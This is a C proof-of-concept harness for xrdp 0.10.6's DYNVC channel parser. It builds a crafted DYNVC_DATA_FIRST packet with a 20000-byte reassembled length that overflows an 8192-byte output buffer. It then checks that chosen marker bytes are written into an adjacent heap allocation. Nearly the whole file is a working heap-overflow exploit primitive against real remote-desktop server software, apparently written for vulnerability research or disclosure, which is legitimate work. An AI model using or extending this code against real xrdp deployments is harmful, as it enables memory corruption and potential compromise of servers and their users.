/*
 * chosen_bytes_real_path.c -- rung-4 chosen-byte proof in the REAL compiled
 * xrdp 0.10.6 DYNVC parse path, using a non-ASan build of libxrdp/libcommon.
 *
 * Drives the real xrdp_channel_process() with a CHANNEL_FLAG_FIRST|LAST
 * DYNVC_DATA_FIRST whose reassembled length is 20000. The data_first callback
 * reproduces the real xrdp_mm_drdynvc_data_first() sink (real trans_create /
 * trans_get_out_s / out_uint8a) with an adjacent canary allocation so the
 * bytes written past the 8192-byte trans out buffer can be read back.
 */
#include "libxrdp.h"
#include "xrdp_constants.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define DYNVC_CHAN 1
#define PAYLOAD_LEN 20000
#define SINK_HDR 28      /* 7 x out_uint32_le in xrdp_mm_drdynvc_data_first */
#define OOB_START (8192 - SINK_HDR)  /* payload index landing at buf+8192 */

static const char M1[] = "DEADBEEF-CR";
static const char M2[] = "C0FFEE00-CR";
static const int M1_PAYLOAD_OFF = OOB_START + 100;
static const int M2_PAYLOAD_OFF = OOB_START + 500;

static int g_calls = 0;
static int g_bytes = -1;
static char *g_canary = NULL;
static long g_canary_delta = 0;

static int
sink_data_first(intptr_t id, int chan_id, char *data, int bytes, int total_bytes)
{
    struct trans *trans;
    struct stream *s;
    long delta;

    g_calls++;
    g_bytes = bytes;
    trans = trans_create(TRANS_MODE_UNIX, 8192, 8192);
    if (trans == NULL) return 1;
    s = trans_get_out_s(trans, 8192);
    if (s == NULL) { trans_delete(trans); return 1; }

    /* Canary allocated immediately after the trans out buffer. */
    g_canary = (char *) malloc(4096);
    delta = g_canary - s->data;
    g_canary_delta = delta;

    out_uint32_le(s, 0);
    out_uint32_le(s, 8 + 8 + 4 + 4 + 4 + bytes);
    out_uint32_le(s, 17);
    out_uint32_le(s, 8 + 4 + 4 + 4 + bytes);
    out_uint32_le(s, 42);
    out_uint32_le(s, bytes);
    out_uint32_le(s, total_bytes);
    out_uint8a(s, data, bytes);   /* writes 20000 bytes into an 8192 buffer */
    s_mark_end(s);

    if (delta >= 8192 && delta < 8192 + 64)
    {
        /* canary[k] corresponds to payload index delta + k - SINK_HDR */
        long k1 = (long) M1_PAYLOAD_OFF + SINK_HDR - delta;
        long k2 = (long) M2_PAYLOAD_OFF + SINK_HDR - delta;
        printf("CANARY delta=%ld k1=%ld k2=%ld m1='%.11s' m2='%.11s'\n",
               delta, k1, k2, g_canary + k1, g_canary + k2);
    }
    else
    {
        printf("CANARY not adjacent (delta=%ld); cannot inspect\n", delta);
    }
    /* no allocator activity after the overflow: the canary's malloc header
     * is deliberately corrupted, so trans_write_copy/trans_delete would
     * abort in glibc before we can report the chosen bytes. */
    return 0;
}

static void
make_chunk(struct stream *s, int total_length, int flags,
           const char *data, int len)
{
    init_stream(s, len + 16);
    out_uint32_le(s, total_length);
    out_uint32_le(s, flags);
    out_uint8a(s, data, len);
    s_mark_end(s);
    s->p = s->data;
}

int
main(void)
{
    struct xrdp_channel chan;
    struct xrdp_mcs mcs;
    struct xrdp_sec sec;
    struct xrdp_rdp rdp;
    struct xrdp_session session;
    struct list *channel_list;
    struct mcs_channel_item item;
    struct stream *in_s;
    struct stream *body;
    int body_len, i, rv;

    static char outbuf[16384];

    setvbuf(stdout, outbuf, _IOFBF, sizeof(outbuf));
    memset(&chan, 0, sizeof(chan));
    memset(&mcs, 0, sizeof(mcs));
    memset(&sec, 0, sizeof(sec));
    memset(&rdp, 0, sizeof(rdp));
    memset(&session, 0, sizeof(session));
    channel_list = list_create();
    memset(&item, 0, sizeof(item));
    strncpy(item.name, "drdynvc", CHANNEL_NAME_LEN);
    item.chanid = 1;
    list_add_item(channel_list, (tintptr) &item);
    mcs.channel_list = channel_list;
    sec.rdp_layer = &rdp;
    rdp.session = &session;
    session.id = 1234;
    chan.sec_layer = &sec;
    chan.mcs_layer = &mcs;
    chan.drdynvc_channel_id = 0;
    chan.drdynvcs[DYNVC_CHAN].data_first = sink_data_first;

    body_len = 1 + 1 + 4 + PAYLOAD_LEN;
    make_stream(body);
    init_stream(body, body_len);
    out_uint8(body, 0x28);
    out_uint8(body, DYNVC_CHAN);
    out_uint32_le(body, PAYLOAD_LEN);
    for (i = 0; i < PAYLOAD_LEN; i++) out_uint8(body, (char)(i & 0xff));
    s_mark_end(body);
    body->p = body->data;
    memcpy(body->data + 6 + M1_PAYLOAD_OFF, M1, sizeof(M1));
    memcpy(body->data + 6 + M2_PAYLOAD_OFF, M2, sizeof(M2));
    /* body->data+6 is payload[0] */

    make_stream(in_s);
    make_chunk(in_s, body_len, 3, body->data, body_len);
    rv = xrdp_channel_process(&chan, in_s, MCS_GLOBAL_CHANNEL + 1);
    printf("rv=%d callback_calls=%d bytes_seen=%d\n", rv, g_calls, g_bytes);

    if (g_canary_delta >= 8192 && g_canary_delta < 8192 + 64)
    {
        long k1 = (long) M1_PAYLOAD_OFF + SINK_HDR - g_canary_delta;
        long k2 = (long) M2_PAYLOAD_OFF + SINK_HDR - g_canary_delta;
        int ok1 = (memcmp(g_canary + k1, M1, sizeof(M1)) == 0);
        int ok2 = (memcmp(g_canary + k2, M2, sizeof(M2)) == 0);
        printf("CHOSEN_BYTES m1=%s m2=%s\n", ok1 ? "PASS" : "FAIL",
               ok2 ? "PASS" : "FAIL");
        /* canary was freed in sink; report here only from saved strings above */
    }
    return 0;
}
